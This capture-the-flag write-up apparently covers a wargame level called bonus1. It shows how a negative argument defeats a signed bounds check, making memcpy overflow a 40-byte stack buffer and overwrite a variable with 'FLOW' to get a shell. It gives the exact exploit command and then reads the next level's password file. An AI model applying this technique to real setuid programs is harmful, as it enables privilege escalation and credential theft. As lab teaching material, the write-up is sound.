At first glance, there's not a lot that could be exploited in this program.  It:
1. Parses the first argument into an int `n` (using `atoi(3)`)
2. Exits if it is greater or equal to 10
3. Copies 4 times the value worth of bytes from the second argument into a 40-byte stack buffer
4. Exits if `n` is not `0x574f4c46` (`FLOW` in ASCII)
5. Executes `/bin/sh`

The win condition is clear: somehow modify `n` using `memcpy(3)`.  Looking at `man 3 memcpy`, the prototype is:

```c
void *memcpy(void *dst, const void *src, size_t n);
```

`size_t` is an unsigned type, `int` is signed.  We have sign mismatch.  It may seem harmless, but it's probably what we'll end up exploiting.  The issue is that signed integers use `N - 1` bits for encoding value (where `N` is the size of the integer, e.g. 32 for `int` on x86) and 1 bit for sign, whereas unsigned integers use all `N` bits for the value and none for sign.  Here are some examples:

```
| Bits                                | Unsigned   | Signed      |
| 00000000 00000000 00000000 00000000 |          0 |           0 |
| 00000000 00000000 00000000 00000001 |          1 |           1 |
| 01111111 11111111 11111111 11111111 | 2147483647 |  2147483647 |
| 10000000 00000000 00000000 00000000 | 2147483648 | -2147483648 |
| 11111111 11111111 11111111 11111100 | 4294967292 |          -4 |
| 11111111 11111111 11111111 11111111 | 4294967295 |          -1 |
```

As we can see, the bit layout is similar but not exactly the same.  For example, if we were to pass `-1` as `argv[1]`, the first condition would not exit early because `-1 >= 0` is false. Then `memcpy(3)` would copy `n * 4` bytes as a `size_t`.  `-1 * 4 = -4 = (size_t)4294967292`, `memcpy(3)` would try to copy around 4GB of data.  We can confirm this:

```
$ ./bonus1 -1 "Hello world"
Segmentation fault (core dumped)
```

Great.  `n` is right after the 40-byte buffer, so we need to find a bit sequence that would allow us to pass `44` as length for `memcpy(3)`.  `n * 4` is the same as `n << 2`, so we need 11 and a sign bit.  It would be `10000000 00000000 00000000 00001100` in binary, so `-2147483637` in decimal.  Let's try that:

```
$ env -i ~/bonus1 -2147483637 "Hello world"
$ echo $?
0
```

It returned 0, so now it's only a matter of writing the correct value in `argv[2]`:

```
$ env -i ~/bonus1 -2147483637 "$(perl -e 'print "B" x 40', "FLOW")"
$ cat ~bonus2/.pass
```

And we're done.
